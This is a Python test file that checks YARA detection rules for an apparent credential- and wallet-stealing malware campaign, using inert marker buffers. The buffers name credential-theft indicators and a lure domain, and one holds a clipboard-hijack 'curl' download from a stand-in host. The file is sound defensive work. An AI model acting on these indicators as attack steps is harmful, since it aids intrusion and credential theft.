"""Compile YARA rules and exercise inert boundary buffers."""
import unittest
from pathlib import Path

import yara

ROOT = Path(__file__).resolve().parents[1]


class DetectionTests(unittest.TestCase):
    def test_all_yara_rules_compile_and_match_inert_boundaries(self):
        fixtures = {
            'deaddrop_wallet_agent': (
                b'\x7fELF overlord-client/cmd/agent OVERLORD_SERVER_RAW OVERLORD_COMPANY_WALLET_EP X-Company-Wallet-Client-Id',
                b'\x7fELF overlord-client/cmd/agent OVERLORD_SERVER_RAW OVERLORD_COMPANY_WALLET_EP',
            ),
            'deaddrop_capture_agent': (
                b'OVERLORD_SERVER_RAW overlord-client/cmd/agent/capture.CaptureAndSend overlord-client/cmd/agent/capture.encodeBlocks overlord-client/cmd/agent/capture.blockChanged overlord-client/cmd/agent/capture.copyPrev',
                b'OVERLORD_SERVER_RAW overlord-client/cmd/agent/capture.CaptureAndSend overlord-client/cmd/agent/capture.encodeBlocks overlord-client/cmd/agent/capture.blockChanged',
            ),
            'deaddrop_vsix_manifest': (
                b'google-update-support google-dev-tools onStartupFinished googleUpdateSupport.companyWalletServerUrl googleUpdateSupport.companyWalletClientId',
                b'google-update-support google-dev-tools onStartupFinished googleUpdateSupport.companyWalletServerUrl',
            ),
            'deaddrop_stage3_collector': (
                b'GoogleUpdateSupporterNode GUS_UPLOAD_CHUNK_SIZE DEFAULT_PHASE3_MAX_MS OVERLORD_KEEP_AGENT_STATE',
                b'GUS_UPLOAD_CHUNK_SIZE DEFAULT_PHASE3_MAX_MS OVERLORD_KEEP_AGENT_STATE',
            ),
            'deaddrop_clickfix_lure': (
                b'cmdline_copied text/plain VERIFY- clipboardData.setData' + b' ' * (16 * 1024 + 1),
                b'text/plain VERIFY- clipboardData.setData' + b' ' * (16 * 1024 + 1),
            ),
            'deaddrop_clickfix_fleet_bundle': (
                b'navigator.clipboard.writeText text/plain cmdline_copied curl -ks VERIFY- perl -MPOSIX -e',
                b'navigator.clipboard.writeText text/plain cmdline_copied curl -ks perl -MPOSIX -e',
            ),
            'deaddrop_clickfix_copy_hijack': (
                b'navigator.clipboard.writeText("curl -ks https://example.invalid/payload")' + b' ' * (16 * 1024 + 1),
                b'navigator.clipboard.writeText("npm install example")' + b' ' * (16 * 1024 + 1),
            ),
            'deaddrop_clickfix_device_check': (
                b'tensorflow three device-check curl -ks ' + b' ' * (300 * 1024 + 1),
                b'tensorflow three device-check ' + b' ' * (300 * 1024 + 1),
            ),
            'deaddrop_clickfix_d2s_build': (
                b'perl -MPOSIX POSIX::setsid design-challenge /guide.mp4 track-activity',
                b'perl -MPOSIX POSIX::setsid design-challenge track-activity',
            ),
            'deaddrop_clickfix_d2s_stage1': (
                b'd2saitrade.ink /guard-launcher-result deepfake_guard',
                b'example.invalid /guard-launcher-result deepfake_guard',
            ),
            'deaddrop_stage1_dropper': (
                b'guard-launcher-result X-Guard-Platform deepfake_guard NVDG_DETACHED',
                b'guard-launcher-result NVDG_DETACHED',
            ),
            'deaddrop_stage2_installer': (
                b'deepfake_guard_work deepfake_guard_run.sh',
                b'deepfake_guard_work',
            ),
            'deaddrop_encrypted_stage3_loader': (
                b'const _0x1=require("crypto") aes-256-gcm createDecipheriv setAuthTag _compile',
                b'const _0x1=require("crypto") createDecipheriv',
            ),
            'deaddrop_electron_com_elevation_source': (
                b'3E5FC7F9-9A51-4367-9063-A120244FBEC7 Elevation:Administrator!new: ELECTRON_RUN_AS_NODE process.execPath --company-wallet-job gus-phase2-',
                b'Elevation:Administrator!new: ELECTRON_RUN_AS_NODE process.execPath --company-wallet-job gus-phase2-',
            ),
            'deaddrop_windows_node_collector': (
                b'--company-wallet-phase1-local --company-wallet-job Login Data _phase1.zip',
                b'--company-wallet-phase1-local Login Data _phase1.zip',
            ),
            'deaddrop_vscode_node_bootstrap': (
                b'ELECTRON_RUN_AS_NODE X-Company-Wallet-Client-Id' + b' ' * (32 * 1024 + 1),
                b'ELECTRON_RUN_AS_NODE benign' + b' ' * (32 * 1024 + 1),
            ),
            'deaddrop_app_bound_credential_source': (
                b'Login Data Local State app_bound_encrypted_key DPAPI AES-GCM',
                b'Login Data Local State app_bound_encrypted_key DPAPI',
            ),
            'deaddrop_abe_bypass_source': (
                b'app_bound_encrypted_key IElevator DecryptData 708860E0-F641-4611-8895-7D867DD3675B CryptUnprotectData',
                b'app_bound_encrypted_key IElevator 708860E0-F641-4611-8895-7D867DD3675B CryptUnprotectData',
            ),
            'deaddrop_home_credential_sweep': (
                b'CREDENTIAL_NAME_RE phase3 DEFAULT_PHASE3_MAX_MS DEFAULT_PHASE3_ROOT_MAX_MS macTccReadableCache CloudStorage',
                b'CREDENTIAL_NAME_RE DEFAULT_PHASE3_MAX_MS DEFAULT_PHASE3_ROOT_MAX_MS macTccReadableCache CloudStorage',
            ),
            'deaddrop_resolver_source': (
                b'gitlab.com/drop-indexing/tasks /-/raw/main/config.json OVERLORD_SERVER_RAW',
                b'gitlab.com/drop-indexing/tasks /-/raw/main/config.json',
            ),
            'deaddrop_linux_persistence_source': (
                b'/etc/systemd/system/google-agent.service systemctl enable google-agent.service unitStaging',
                b'/etc/systemd/system/google-agent.service systemctl enable',
            ),
            'deaddrop_windows_agent_bundle': (
                b'PK\x03\x04run-update-agent.vbs update-agent.js',
                b'PK\x03\x04run-update-agent.vbs',
            ),
            'echoes_stage2_task_staging': (
                b'OneDrive Reporting Task- Register-ScheduledTask New-ScheduledTaskTrigger whale.vbs -WindowStyle Hidden',
                b'OneDrive Reporting Task- Register-ScheduledTask New-ScheduledTaskTrigger whale.vbs',
            ),
            'echoes_wallet_admin_frontend': (
                b'adminBase.post("admin/wallets/claim-all/") ColdKey mnemonic Aptos EVM',
                b'adminBase.post("admin/wallets/claim-all/") ColdKey mnemonic',
            ),
            'echoes_repository_monitor_frontend': (
                b'github-jobs-check/ clone_url httpStatus warming_up httpStatus === 404 refresh',
                b'github-jobs-check/ clone_url httpStatus refresh',
            ),
            'echoes_commit_metadata_harvester': (
                b'https://api.github.com stars: MAX_BRANCHES_PER_REPO = 20 MAX_SEARCH_RESULTS = 1000 author_email committer_email sqlite3',
                b'https://api.github.com stars: MAX_BRANCHES_PER_REPO = 20 MAX_SEARCH_RESULTS = 1000 author_email sqlite3',
            ),
            'echoes_target_pool_merge': (
                b'ANTISPAM_DOMAINS def is_antispam(email: str) results_antispam.db results_safe.db CREATE TABLE IF NOT EXISTS emails INSERT OR IGNORE INTO emails',
                b'ANTISPAM_DOMAINS def is_antispam(email: str) results_antispam.db results_safe.db CREATE TABLE IF NOT EXISTS emails',
            ),
            # Exact-hash positives are verified in the private artifact replay,
            # never by bundling the source emails, archives or payloads here.
            'exact_sample_hashes': (
                None,
                b'inert test buffer; not a retained sample',
            ),
        }
        yara_files = sorted((ROOT / 'rules/yara').glob('*.yar'))
        self.assertEqual({path.stem for path in yara_files}, set(fixtures))
        rules = yara.compile(filepaths={path.stem: str(path) for path in yara_files})
        for namespace, (positive, negative) in fixtures.items():
            if positive is None:
                with self.subTest(rule=namespace, case='inert boundary negative'):
                    matched = {match.namespace for match in rules.match(data=negative)}
                    self.assertNotIn(namespace, matched)
                continue
            with self.subTest(rule=namespace, case='positive'):
                matched = {match.namespace for match in rules.match(data=positive)}
                self.assertIn(namespace, matched)
            with self.subTest(rule=namespace, case='boundary negative'):
                matched = {match.namespace for match in rules.match(data=negative)}
                self.assertNotIn(namespace, matched)

    def test_wallet_yara_requires_elf_header_and_marker_conjunction(self):
        rules = yara.compile(filepath=str(ROOT / 'rules/yara/deaddrop_wallet_agent.yar'))
        framework = b'overlord-client/cmd/agent OVERLORD_SERVER_RAW'
        wallet = b' OVERLORD_COMPANY_WALLET_EP X-Company-Wallet-Client-Id'
        markers = framework + wallet
        self.assertTrue(rules.match(data=b'\x7fELF' + markers))
        self.assertTrue(rules.match(data=b'\x7fELF' + markers.decode().encode('utf-16le')))
        # Marker-rich prose no longer matches without an ELF header at offset zero.
        self.assertFalse(rules.match(data=b'Research notes only: ' + markers))
        self.assertFalse(rules.match(data=markers))
        self.assertFalse(rules.match(data=b'\x7fELF' + framework))
        self.assertFalse(rules.match(data=b'\x7fELF' + framework + b' OVERLORD_COMPANY_WALLET_EP'))

    def test_capture_yara_requires_framework_and_four_symbols(self):
        rules = yara.compile(filepath=str(ROOT / 'rules/yara/deaddrop_capture_agent.yar'))
        environment = b'OVERLORD_SERVER_RAW '
        symbols = b' '.join([
            b'overlord-client/cmd/agent/capture.CaptureAndSend',
            b'overlord-client/cmd/agent/capture.encodeBlocks',
            b'overlord-client/cmd/agent/capture.blockChanged',
            b'overlord-client/cmd/agent/capture.copyPrev',
        ])
        self.assertTrue(rules.match(data=environment + symbols))
        self.assertFalse(rules.match(data=symbols))
        self.assertFalse(rules.match(data=environment + b' '.join(symbols.split()[:3])))

    def test_vsix_manifest_yara_uses_identity_and_configuration(self):
        rules = yara.compile(filepath=str(ROOT / 'rules/yara/deaddrop_vsix_manifest.yar'))
        identity = b'google-update-support google-dev-tools onStartupFinished '
        config = b'googleUpdateSupport.companyWalletServerUrl googleUpdateSupport.companyWalletClientId'
        self.assertTrue(rules.match(data=identity + config))
        self.assertFalse(rules.match(data=identity))
        self.assertFalse(rules.match(data=config))

    def test_stage3_yara_requires_task_and_three_constants(self):
        rules = yara.compile(filepath=str(ROOT / 'rules/yara/deaddrop_stage3_collector.yar'))
        task = b'GoogleUpdateSupporterNode '
        constants = b'GUS_UPLOAD_CHUNK_SIZE DEFAULT_PHASE3_MAX_MS OVERLORD_KEEP_AGENT_STATE'
        self.assertTrue(rules.match(data=task + constants))
        self.assertFalse(rules.match(data=constants))
        self.assertFalse(rules.match(data=task + b'GUS_UPLOAD_CHUNK_SIZE DEFAULT_PHASE3_MAX_MS'))


if __name__ == '__main__':
    unittest.main()
